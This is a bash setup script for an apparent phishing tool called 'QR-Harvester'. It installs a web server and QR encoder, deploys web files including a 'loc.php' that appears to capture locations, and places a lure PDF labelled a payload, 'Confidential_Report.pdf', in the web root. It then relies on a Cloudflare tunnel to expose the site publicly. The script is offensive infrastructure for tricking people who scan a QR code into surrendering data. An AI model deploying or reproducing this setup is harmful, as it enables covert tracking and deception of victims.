#!/bin/bash

echo "[*] Starting QR-Harvester Setup..."

# Install dependencies
sudo apt update
sudo apt install apache2 php php-curl qrencode cloudflared -y

# Set permissions
sudo chown -R www-data:www-data /var/www/html/
sudo chmod -R 755 /var/www/html/

# Copy web files if they exist in a 'web' folder
if [ -f "web/index.html" ]; then
    sudo cp web/index.html /var/www/html/
    sudo cp web/loc.php /var/www/html/
    echo "[*] Web files copied from 'web' folder."
else
    echo "[!] Warning: web/index.html not found. Make sure you are in the project root."
fi

# Copy PDF payload if it exists
if [ -f "payloads/Confidential_Report.pdf" ]; then
    sudo cp payloads/Confidential_Report.pdf /var/www/html/
    sudo chown www-data:www-data /var/www/html/Confidential_Report.pdf
    echo "[*] PDF copied successfully."
else
    echo "[!] Warning: payloads/Confidential_Report.pdf not found."
fi

# Restart Apache
sudo systemctl restart apache2

echo "[+] Setup complete. Ensure Cloudflared is running."
